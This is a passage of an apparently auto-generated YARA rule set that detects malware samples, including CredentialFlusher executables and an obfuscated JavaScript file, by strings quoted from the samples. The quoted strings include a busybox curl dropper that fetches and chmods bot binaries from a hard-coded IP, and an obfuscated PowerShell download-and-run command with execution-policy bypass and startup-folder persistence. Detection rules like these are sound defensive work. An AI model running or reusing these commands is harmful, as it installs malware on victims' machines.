      $s3 = "4ZThlOGU4ZThlOGU4ZThlOGU4ZThlOGU4ZThlOGU4ZThlOGU4ZThlOGU4ZThbOFs4SDpIOkg6SDpYOFg4WDhYOFg4WThZOFk4WThZOFk4WThIOkg6SDpIOkg6SDpIOkg" ascii /* base64 encoded string 'e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8[8[8H:H:H:H:X8X8X8X8X8Y8Y8Y8Y8Y8Y8Y8H:H:H:H:H:H:H:H' */ /* score: '26.00'*/
      $s4 = "4ZDhIOkg6SDpIOkg6SDpIOkg6SDpIOkg6SDpIOkg6SDpIOkg6SDpIOkg6SDpIOkg6SDpIOkg6SDpIOkg6SDpIOkg6ZThlOGU4ZThlOGU4ZThlOFo4ZThlOGU4ZThlOGU" ascii /* base64 encoded string 'd8H:H:H:H:H:H:H:H:H:H:H:H:H:H:H:H:H:H:H:H:H:H:H:H:H:H:H:H:H:H:H:H:e8e8e8e8e8e8e8e8Z8e8e8e8e8e8e' */ /* score: '26.00'*/
      $s5 = "pGeoyMQH6aBniMjcpGek5KRn7aFnKaVnOBO89KRnqMjEpGfkpGftoWchoWcopGG4yLwTvMykYajIvKTXNJiMw6Rnv/Skbxb8ntykZ+ekEy6kbRbs/OzsnvCkby7LoGet" ascii /* score: '24.00'*/
      $s6 = "ZZjI9LukbwDMqGetjKRnlbythQSsy+zsr2HYbK0tDOStZzQtCuakEyekEyGkEyIEXRoTE6RnJKBh6JPfPqRnL6QbG6RnKqDHLt8+pBsbpGcpoMcu3z6kGxukYejnpGew" ascii /* score: '24.00'*/
      $s7 = "6SDopOik6KTopOik6KTopOik6KTopOik6KTopOik6KTopOik6KTopOik6KTopOik6KTopOik6KTopOik6KTopOik6KTopOik6KTopOik6KTopOik6KTopOik6KTpXOkg" ascii /* base64 encoded string 'H:):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):W:H' */ /* score: '21.00'*/
      $s8 = "5c346Ojo6MDo6OmhVc1RTTlNbVlNAXzo6OjowOjo6Ojo6OmhVb1RTVFNOU1tWU0BfOjo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo" ascii /* base64 encoded string 's~::::0:::hUsTSNS[VS@_::::0:::::::hUoTSTSNS[VS@_:::::::::::::::::::::::::::::::::::::::::::::::' */ /* score: '21.00'*/
      $s9 = "6Ojo6Ojo6Ojo6Ozs7Ozs7KDUpMTExMTExMTExMTExMTExMSk1Ljs7Ozs7Ozo6Ojo6Ojo6Ojo6Ojo6Ojs7Ozs7Ozs0NSoxMTExMTExMTExMTErNTQ7Ozs7Ozs7Ojo6Ojo" ascii /* base64 encoded string ':::::::::;;;;;;(5)1111111111111111)5.;;;;;;:::::::::::::::;;;;;;;45*111111111111+54;;;;;;;:::::' */ /* score: '21.00'*/
      $s10 = "7bztvO287bztvO207bTttO2I7bTttO207YztuO287SDpIOmA7YDtgO2A7YDtgO2A7YDtgO2A7SDpIOkg6SDpIOkg6YTthO2E7YTthO2E7YTthO2E7YTtIOkg6SDpIOkg" ascii /* base64 encoded string 'o;o;o;o;o;m;m;m;b;m;m;m;c;n;o;H:H:`;`;`;`;`;`;`;`;`;`;H:H:H:H:H:H:a;a;a;a;a;a;a;a;a;a;H:H:H:H:H' */ /* score: '21.00'*/
      $s11 = "6MjoyOjI6MjoyOjI6MjoyOjI6MjoyOjI6Mjo8Oj06MjoyOik6KTopOik6KTopOik6KTopOik6KTopOik6KTopOik6KTopOik6KTopOik6KTopOik6KTopOik6KTopOik" ascii /* base64 encoded string '2:2:2:2:2:2:2:2:2:2:2:2:2:<:=:2:2:):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):)' */ /* score: '21.00'*/
      $s12 = "7cDtwO3A7cDtwO3A7cDtwO3A7cDtwO3A7cDtwO3A7cDtwO3A7cDtwO3A7cDtwO3A7cDtwO3A7cDtwO3A7cDtwO3A7cDtwO3A7cDtwO3A7cDtwO3A7cDtwO3A7cDtwO3A" ascii /* base64 encoded string 'p;p;p;p;p;p;p;p;p;p;p;p;p;p;p;p;p;p;p;p;p;p;p;p;p;p;p;p;p;p;p;p;p;p;p;p;p;p;p;p;p;p;p;p;p;p;p;p' */ /* score: '21.00'*/
      $s13 = "6Ojo6Ojo6Ojo6Ojo7Ozs7Ozs7Ozw9MjMwMTExMTAzMjY3Ozs7Ozs7Ozs6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ozs7Ozs7Ozs7Ozg5Pj8/Pjk4Ozs7Ozs7Ozs7Ozo6Ojo6Ojo" ascii /* base64 encoded string ':::::::::::;;;;;;;;<=230111103267;;;;;;;;:::::::::::::::::::;;;;;;;;;;89>??>98;;;;;;;;;;:::::::' */ /* score: '21.00'*/
      $s14 = "7LTstOy07LTstOy07LTstOy07LTstOy07LTstOy07LTstOy07LTtIOi07LTstOy07LTstOy07LTstO0g6LTtIOkg6LTstOy07LTstOy07LTtIOkg6SDoiO0g6SDpIOkg" ascii /* base64 encoded string '-;-;-;-;-;-;-;-;-;-;-;-;-;-;-;-;-;-;-;H:-;-;-;-;-;-;-;-;-;H:-;H:H:-;-;-;-;-;-;-;H:H:H:";H:H:H:H' */ /* score: '21.00'*/
      $s15 = "6KTopOik6KTopOik6KTopOik6KTopOik6KTopOik6KTopOik6KTopOik6KTopOik6KTopOik6SDopOik6KTopOik6KTopOik6KTopOik6KTopOik6KTopOik6KTopOik" ascii /* base64 encoded string '):):):):):):):):):):):):):):):):):):):):):):):):):):):H:):):):):):):):):):):):):):):):):):):):)' */ /* score: '21.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 29000KB and
      1 of ($x*) and 4 of them
}

rule d2b4a2ff532ff6d8f5213688324f1b69833efb13dc80d52692dae098f89371d8_d2b4a2ff {
   meta:
      description = "_subset_batch - file d2b4a2ff532ff6d8f5213688324f1b69833efb13dc80d52692dae098f89371d8_d2b4a2ff.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d2b4a2ff532ff6d8f5213688324f1b69833efb13dc80d52692dae098f89371d8"
   strings:
      $s1 = "const _0x112fa8=_0x180f;(function(_0x13c8b9,_0x35f660){const _0x15b386=_0x180f,_0x66ea25=_0x13c8b9();while(!![]){try{const _0x2c" ascii /* score: '30.00'*/
      $s2 = "// after next line to fix a bleed issue on macOS: https://github.com/chalk/chalk/pull/92" fullword ascii /* score: '17.00'*/
      $s3 = "0x27e)+_0x42ac66(0x6bc)]={'isActive':()=>_0x1ab7cb,'getInterceptCount':()=>_0x1c41fa,'getOriginalMethods':()=>_0x2a20cb,'forceSh" ascii /* score: '14.00'*/
      $s4 = "HL','sendAsync','1LVpMCURyE','log','1A5Fc40D82','destinatio','TJCevwYQhz','R6zR','yVHgJ','5ttztjymc8','RuMGo','E6FCd3d45a','Sk8H" ascii /* score: '9.00'*/
      $s5 = "a0m','avnfpmu59a','clone','iMpIh','TK5r74dFyM','Kivgs','hlkp7sk0g8','LdPtx4xqmA','16mKiSoZNT','0xdedda1A0','mlgET','upwRp','tfqR" ascii /* score: '9.00'*/
      $s6 = "_0x5222f9(0x627)+_0x5222f9(0x4b5)+'39','mlgET':_0x5222f9(0x256)+_0x5222f9(0x755)+_0x5222f9(0x64c)+_0x5222f9(0x685)+'51','Sflwm':" ascii /* score: '9.00'*/
      $s7 = "FGZ','1DwsWaXLds','HcYDT','TcKDubw44u','0x322FE72E','U1mo','xivpz','TCqKY','mB9z','IEyeW','1Bjvx6WXt9','t64gfujaz8','iwqMJ','tec" ascii /* score: '9.00'*/
      $s8 = "6EGFmukH','kU8qq868xF','headers','YXjm','4XyR','b94E6aE11D','suG9','nV67','jrneuurc43','BEiKn','TQXoAYKPuz','ugvf2d3y6q','0x7C50" ascii /* score: '9.00'*/
      $s9 = "2f9(0x54b),'jiCnV':_0x5222f9(0x1c8)+_0x5222f9(0x75f)+_0x5222f9(0x1ef)+_0x5222f9(0x3d9)+_0x5222f9(0x55d)+_0x5222f9(0x721),'IEyeW'" ascii /* score: '9.00'*/
      $s10 = "467j','SushiSwap','xgRWF','yoePF4Rr1c','LCszu','w4sxf3dwej','Content-Ty','0x30F895a2','wKaGs','DQiKUkGYEx','hs8y0wvusp','54202E2" ascii /* score: '9.00'*/
      $s11 = " _0x56797b=['6ynt','0d8dtj552q','Tumqs9jBcv','CZKkU','VuiPa','D6F68C0710','IOjJb','getRespons','LK2ds9JNq1','send','004873b9D7'," ascii /* score: '9.00'*/
      $s12 = "8ea1156','jBjZx','h:qz6239jk','P5RHLKnRNi','pd03d8zxyc','s8c4z47h0q','h:qqs4grdq','gs2pg0fpnf','get','TSfbXqswod','3FUp','9A4026" ascii /* score: '9.00'*/
      $s13 = "if (lfIndex !== -1) {" fullword ascii /* score: '8.00'*/
      $s14 = "closeAll = close + parent.closeAll;" fullword ascii /* score: '8.00'*/
      $s15 = "return openAll + string + closeAll;" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6d69 and filesize < 200KB and
      8 of them
}

rule CredentialFlusher_signature__2eabe9054cad5152567f0699947a2c5b_imphash__165ad8ae {
   meta:
      description = "_subset_batch - file CredentialFlusher(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_165ad8ae.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "165ad8aea97f5c023619aff80e84f16c32874d34d9b7ff7ed88d685de564e216"
   strings:
      $s1 = "* F/ v4 " fullword ascii /* score: '9.00'*/
      $s2 = "cpiabdvi" fullword ascii /* score: '8.00'*/
      $s3 = "crypwixm" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      all of them
}

rule CredentialFlusher_signature__2eabe9054cad5152567f0699947a2c5b_imphash_ {
   meta:
      description = "_subset_batch - file CredentialFlusher(signature)_2eabe9054cad5152567f0699947a2c5b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8407fe8f63a210fb165aed0095ae5862a7d49c219d02193219a79d3cac3d9930"
   strings:
      $s1 = "Uzazg.dEv" fullword ascii /* score: '10.00'*/
      $s2 = "* s8t`" fullword ascii /* score: '9.00'*/
      $s3 = "3,- -R" fullword ascii /* score: '9.00'*/
      $s4 = "wgcpvlce" fullword ascii /* score: '8.00'*/
      $s5 = "aabrtrqi" fullword ascii /* score: '8.00'*/
      $s6 = "NF|.9JHwp!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      all of them
}

rule CredentialFlusher_signature__2eabe9054cad5152567f0699947a2c5b_imphash__70492d9f {
   meta:
      description = "_subset_batch - file CredentialFlusher(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_70492d9f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "70492d9f6812b381ba4ed76ab16e4e6a117da81761db116ba65d5a9a2fbbe469"
   strings:
      $s1 = "ljcZ:JN:\\<l<" fullword ascii /* score: '10.00'*/
      $s2 = ";-&6\\_3`(" fullword ascii /* score: '9.00'*/ /* hex encoded string 'c' */
      $s3 = "@-5@1=@4%@8" fullword ascii /* score: '9.00'*/ /* hex encoded string 'QH' */
      $s4 = "%tVXs%kW" fullword ascii /* score: '8.00'*/
      $s5 = "rojnpqgu" fullword ascii /* score: '8.00'*/
      $s6 = "vlltuceo" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      all of them
}

rule CredentialFlusher_signature__2eabe9054cad5152567f0699947a2c5b_imphash__dc8cb3c0 {
   meta:
      description = "_subset_batch - file CredentialFlusher(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_dc8cb3c0.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "dc8cb3c02c604ef3e7f39c548eeeb2e853b97feb37374709707e936ed1cacb1a"
   strings:
      $s1 = "* y:30-" fullword ascii /* score: '9.00'*/
      $s2 = "cohvrieh" fullword ascii /* score: '8.00'*/
      $s3 = "kowpshfr" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      all of them
}

rule CredentialFlusher_signature__2eabe9054cad5152567f0699947a2c5b_imphash__b84b1d98 {
   meta:
      description = "_subset_batch - file CredentialFlusher(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_b84b1d98.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b84b1d98e5faac4a9cb10eabd8b25d67055e67629579ae82e6543de4a27d5d88"
   strings:
      $s1 = "3|%>}F\"," fullword ascii /* score: '9.00'*/ /* hex encoded string '?' */
      $s2 = "* q_h " fullword ascii /* score: '9.00'*/
      $s3 = "ednpdhjd" fullword ascii /* score: '8.00'*/
      $s4 = "satitlx" fullword ascii /* score: '8.00'*/
      $s5 = "ukrkfvqx" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      all of them
}

rule CredentialFlusher_signature__2eabe9054cad5152567f0699947a2c5b_imphash__9891c9a4 {
   meta:
      description = "_subset_batch - file CredentialFlusher(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_9891c9a4.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9891c9a43188cd9a6aaf95a9ead2a710887dc73cd06fd7a9508c36ddd7ec5011"
   strings:
      $s1 = "izigtjam" fullword ascii /* score: '8.00'*/
      $s2 = "e)IzZZ* UBG" fullword ascii /* score: '8.00'*/
      $s3 = "kbmtcqmy" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      all of them
}

rule CredentialFlusher_signature__2eabe9054cad5152567f0699947a2c5b_imphash__dbb1c7ec {
   meta:
      description = "_subset_batch - file CredentialFlusher(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_dbb1c7ec.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "dbb1c7ecc2774b409448e5c562263a51ce06f0cd52f16f777fa205cac71b8d70"
   strings:
      $s1 = "3%\"&['@,;9" fullword ascii /* score: '9.00'*/ /* hex encoded string '9' */
      $s2 = "T - 0A" fullword ascii /* score: '9.00'*/
      $s3 = "ejsmvimr" fullword ascii /* score: '8.00'*/
      $s4 = "yulhmkcy" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      all of them
}

rule CredentialFlusher_signature__2eabe9054cad5152567f0699947a2c5b_imphash__310548ac {
   meta:
      description = "_subset_batch - file CredentialFlusher(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_310548ac.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "310548ac49f4240b5071f76555ccdb4fea3f8605cfcdf4ed8f5fa8e3d077e138"
   strings:
      $s1 = "USER32.dql" fullword ascii /* score: '13.00'*/
      $s2 = "rmlOGD@" fullword ascii /* score: '9.00'*/
      $s3 = "vwqulnnz" fullword ascii /* score: '8.00'*/
      $s4 = "rkqntedp" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      all of them
}

rule CredentialFlusher_signature__2eabe9054cad5152567f0699947a2c5b_imphash__23b3afcd {
   meta:
      description = "_subset_batch - file CredentialFlusher(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_23b3afcd.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "23b3afcd4a52d8d31aea02ab3c8e3986a17c709c63c09b15e1566a428ee9bba6"
   strings:
      $s1 = "k:\\qNjB.@b" fullword ascii /* score: '10.00'*/
      $s2 = "pauktwno" fullword ascii /* score: '8.00'*/
      $s3 = "vwkjgzwf" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      all of them
}

rule CredentialFlusher_signature__2eabe9054cad5152567f0699947a2c5b_imphash__770de35e {
   meta:
      description = "_subset_batch - file CredentialFlusher(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_770de35e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "770de35effa2fe14e78a0eb33424b78d3c23625368471f33201ffe1a8816f3f6"
   strings:
      $s1 = "* 0>5(" fullword ascii /* score: '9.00'*/
      $s2 = "eenszfnf" fullword ascii /* score: '8.00'*/
      $s3 = "atdmoehn" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      all of them
}

rule CredentialFlusher_signature__2eabe9054cad5152567f0699947a2c5b_imphash__d88a790f {
   meta:
      description = "_subset_batch - file CredentialFlusher(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_d88a790f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d88a790fd3e15eb2000b9c13a5dd7ee7299708550cc65e9a5648f87130ce1e3f"
   strings:
      $s1 = "* */`+6L" fullword ascii /* score: '9.00'*/
      $s2 = "zRAn!." fullword ascii /* score: '8.00'*/
      $s3 = "mhiqztal" fullword ascii /* score: '8.00'*/
      $s4 = "owyoyxgp" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      all of them
}

rule CredentialFlusher_signature__2eabe9054cad5152567f0699947a2c5b_imphash__3e640051 {
   meta:
      description = "_subset_batch - file CredentialFlusher(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_3e640051.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3e640051b73b7e12ae3cb6929e7f50f1ebe5f8eac583ee82395c8bcc35b8fda0"
   strings:
      $s1 = "PKAT.dNM" fullword ascii /* score: '10.00'*/
      $s2 = "j 0o ht -x " fullword ascii /* score: '9.00'*/
      $s3 = "hknupyba" fullword ascii /* score: '8.00'*/
      $s4 = "FhPl -U" fullword ascii /* score: '8.00'*/
      $s5 = "fxrxakur" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      all of them
}

rule CredentialFlusher_signature__2eabe9054cad5152567f0699947a2c5b_imphash__d1455fdf {
   meta:
      description = "_subset_batch - file CredentialFlusher(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_d1455fdf.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d1455fdfde5afaf43cfc2eb62420814da19f5174e356babbe74e23d377145105"
   strings:
      $s1 = "* $<9{T" fullword ascii /* score: '9.00'*/
      $s2 = "* Lg>90" fullword ascii /* score: '9.00'*/
      $s3 = "* c. x2 :7uK" fullword ascii /* score: '9.00'*/
      $s4 = "=21_\\`#>" fullword ascii /* score: '9.00'*/ /* hex encoded string '!' */
      $s5 = "rvtevox" fullword ascii /* score: '8.00'*/
      $s6 = "DpYz+- o" fullword ascii /* score: '8.00'*/
      $s7 = "dpjvmveo" fullword ascii /* score: '8.00'*/
      $s8 = "uerqodop" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      all of them
}

rule CredentialFlusher_signature__2eabe9054cad5152567f0699947a2c5b_imphash__501cf3a1 {
   meta:
      description = "_subset_batch - file CredentialFlusher(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_501cf3a1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "501cf3a1208dfbf4080037d168c0018d0625cba51f60b37c2ac6c4e375aa8700"
   strings:
      $s1 = "CRFSpy&" fullword ascii /* score: '9.00'*/
      $s2 = "sexelcwq" fullword ascii /* score: '8.00'*/
      $s3 = "htsyqwvk" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      all of them
}

rule d603534c586afbe361df24e8ef0e100577eb0a47c9e9d0537b4ff79e7961fd00_d603534c {
   meta:
      description = "_subset_batch - file d603534c586afbe361df24e8ef0e100577eb0a47c9e9d0537b4ff79e7961fd00_d603534c.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d603534c586afbe361df24e8ef0e100577eb0a47c9e9d0537b4ff79e7961fd00"
   strings:
      $x1 = " %GH% %a3% %ex% -c \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;.((GV '*mDR*').nAMe[3,11,2]" ascii /* score: '37.00'*/
      $x2 = "set ex=-exec bypass -w 1" fullword ascii /* score: '31.00'*/
      $s3 = " %GH% %a3% %ex% -c Copy-Item -Path '%~0' -Destination ([System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::S" ascii /* score: '26.00'*/
      $s4 = "jOIN'') (.((GV '*Wh*').nAMe[4,0,7]-jOIN'') 'https://globulinkes.com/update.php' -UseBasicParsing).Content;\"" fullword ascii /* score: '26.00'*/
      $s5 = " %GH% %a3% %ex% -c Copy-Item -Path '%~0' -Destination ([System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::S" ascii /* score: '26.00'*/
      $s6 = "  SET \"S=%%i - %BASE%\"" fullword ascii /* score: '19.00'*/
      $s7 = "ECHO PROCESSOR_ARCHITECTURE:  %PROCESSOR_ARCHITECTURE%" fullword ascii /* score: '19.00'*/
      $s8 = " %GH% %a3% %ex% -c \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;.((GV '*mDR*').nAMe[3,11,2]" ascii /* score: '19.00'*/
      $s9 = "REM Use cmd's case-insensitive features: trick by calling cmd /c exit after setting variable? Simpler: use PowerShell? NO (avoid" ascii /* score: '16.00'*/
      $s10 = "REM Use cmd's case-insensitive features: trick by calling cmd /c exit after setting variable? Simpler: use PowerShell? NO (avoid" ascii /* score: '16.00'*/
      $s11 = "set a3=%a1%%a2%ll.exe" fullword ascii /* score: '16.00'*/
      $s12 = "REM boring_chores.bat" fullword ascii /* score: '15.00'*/
      $s13 = "FOR /L %%i IN (%START%,1,%COUNT%) DO (" fullword ascii /* score: '15.00'*/
      $s14 = "FOR /L %%i IN (1,1,%WAITCOUNT%) DO (" fullword ascii /* score: '15.00'*/
      $s15 = "REM This file is verbose by design and avoids any system-modifying commands." fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x4540 and filesize < 40KB and
      1 of ($x*) and 4 of them
}

rule d752510cb0a0f06cca93b66f608a39835d30395f969ab6a1c3f46981792e5cb0_d752510c {
   meta:
      description = "_subset_batch - file d752510cb0a0f06cca93b66f608a39835d30395f969ab6a1c3f46981792e5cb0_d752510c.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d752510cb0a0f06cca93b66f608a39835d30395f969ab6a1c3f46981792e5cb0"
   strings:
      $s1 = "jeiX:* Vk" fullword ascii /* score: '8.00'*/
      $s2 = "Kbiv*  t" fullword ascii /* score: '8.00'*/
      $s3 = "heQX0* V" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x0000 and filesize < 2000KB and
      all of them
}

rule d7bda007ea120e2868f3ebf110bb7776fc463588aedad6deb0c67ed19b0512d0_d7bda007 {
   meta:
      description = "_subset_batch - file d7bda007ea120e2868f3ebf110bb7776fc463588aedad6deb0c67ed19b0512d0_d7bda007.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d7bda007ea120e2868f3ebf110bb7776fc463588aedad6deb0c67ed19b0512d0"
   strings:
      $s1 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.spc ; /bin/busybox curl -O http://107.152.41.192/bot.spc ; chmod 777 b" ascii /* score: '25.00'*/
      $s2 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.spc ; /bin/busybox curl -O http://107.152.41.192/bot.spc ; chmod 777 b" ascii /* score: '25.00'*/
      $s3 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.ppc ; /bin/busybox curl -O http://107.152.41.192/bot.ppc ; chmod 777 b" ascii /* score: '25.00'*/
      $s4 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.ppc ; /bin/busybox curl -O http://107.152.41.192/bot.ppc ; chmod 777 b" ascii /* score: '25.00'*/
      $s5 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.arm5 ; /bin/busybox curl -O http://107.152.41.192/bot.arm5 ; chmod 777" ascii /* score: '22.00'*/
      $s6 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.mipsel ; /bin/busybox curl -O http://107.152.41.192/bot.mipsel ; chmod" ascii /* score: '22.00'*/
      $s7 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.arm6 ; /bin/busybox curl -O http://107.152.41.192/bot.arm6 ; chmod 777" ascii /* score: '22.00'*/
      $s8 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.i586 ; /bin/busybox curl -O http://107.152.41.192/bot.i586 ; chmod 777" ascii /* score: '22.00'*/
      $s9 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.i686 ; /bin/busybox curl -O http://107.152.41.192/bot.i686 ; chmod 777" ascii /* score: '22.00'*/
      $s10 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.m68k ; /bin/busybox curl -O http://107.152.41.192/bot.m68k ; chmod 777" ascii /* score: '22.00'*/
      $s11 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.arm5 ; /bin/busybox curl -O http://107.152.41.192/bot.arm5 ; chmod 777" ascii /* score: '22.00'*/
      $s12 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.arm7 ; /bin/busybox curl -O http://107.152.41.192/bot.arm7 ; chmod 777" ascii /* score: '22.00'*/
      $s13 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.arm4 ; /bin/busybox curl -O http://107.152.41.192/bot.arm4 ; chmod 777" ascii /* score: '22.00'*/
      $s14 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.arm4 ; /bin/busybox curl -O http://107.152.41.192/bot.arm4 ; chmod 777" ascii /* score: '22.00'*/
      $s15 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.mips ; /bin/busybox curl -O http://107.152.41.192/bot.mips ; chmod 777" ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 5KB and
      8 of them
}

rule d97d90564ec30994480d8eb4fa08660d6a826c6d9a79aa856ef14cdc575d0e39_d97d9056 {
   meta:
      description = "_subset_batch - file d97d90564ec30994480d8eb4fa08660d6a826c6d9a79aa856ef14cdc575d0e39_d97d9056.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d97d90564ec30994480d8eb4fa08660d6a826c6d9a79aa856ef14cdc575d0e39"
   strings:
      $s1 = "61202B2027" ascii /* score: '17.00'*/ /* hex encoded string 'a + '' */
      $s2 = "2E6D7369273B72" ascii /* score: '17.00'*/ /* hex encoded string '.msi';r' */
      $s3 = "6D696E2E626F6F6B696E672E636F6D273B72" ascii /* score: '17.00'*/ /* hex encoded string 'min.booking.com';r' */
      $s4 = "2D73776973732E636F6D2F" ascii /* score: '17.00'*/ /* hex encoded string '-swiss.com/' */
      $s5 = "696F6E2072" ascii /* score: '17.00'*/ /* hex encoded string 'ion r' */
      $s6 = "DcLMJKMhZrMQeFQhPCRRHptSEbKlgCcvJGsqIInESSpNGAbWZqSPLYzNisHizbAXOQHYNaZGPMzpzgMDznLqjNklGeIPAEErRRyptDIzQMAzZJOBgEjMPKoBgWRjRKFK" ascii /* score: '9.00'*/
      $s7 = "MhwoMpWHPpRscOjaKccoCyeBydHZZCqKgtksXZlkvwJkpJZtrJVZaunODvpjhxiNzGMjdrCkrstFotLoDNhQgQjlFVockCCxOwljxqQAGlhiBiZJjAfTPSgiWadH" fullword ascii /* score: '9.00'*/
      $s8 = "keuoGizrhskUAQPomyfnGQPTjiUXLjgXbmWTxcYNhBsduCGTmVHGjkPUObFXObfyMNsOtvrKaSGFYlYhbAkqcZoqWCFVXByFWtRhJsZrewgQeKvcCXvNrpVnYBrqqVnZ" ascii /* score: '9.00'*/
      $s9 = "TAjeUrXjbtLfsXMLHcTzFlOgYeIHAiAIJHxdbQILALlxdpuBpfjOCoThmCGqjPistDWlZikqTIztzQDikGSUzmGUoPrZKSckdtEaTIbGvtutpZhVzYFcwNtHwCxKrKgB" ascii /* score: '9.00'*/
      $s10 = "HHXhhWJveMZWNkMxQGiwVsbHdxIXlZhGHprRmgUJunhClRnvKUTLbIpPfQEjOmKEfSPYtuKjmYBhKZVMKMMRGVfyzclVckvIddX" fullword ascii /* score: '9.00'*/
      $s11 = "cKuqfJatAdNUQvapSungDirkoSzdbRukZgZtrdqwcBkadLjYcFZyXsztSJCMKwRjjdujWgxpDrEByQHcjaAVrvMhhfbiadlfkArAQzCwIkvgoxuBCZdjwwsnRNCqFOOa" ascii /* score: '9.00'*/
      $s12 = "for($i=0; $i -lt $zdjvNLqv.Length; $i+=2){[void]$nZnzzMYzO.Append( [char]([Convert]::ToInt32($zdjvNLqv.Substring($i,2),16)) )};" fullword ascii /* score: '8.00'*/
      $s13 = "$zdjvNLqv = $WCNWee  -replace ']','4' -replace '>','5';" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a7a and filesize < 60KB and
      8 of them
}

rule DarkCloud_signature__3 {
   meta:
      description = "_subset_batch - file DarkCloud(signature).js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
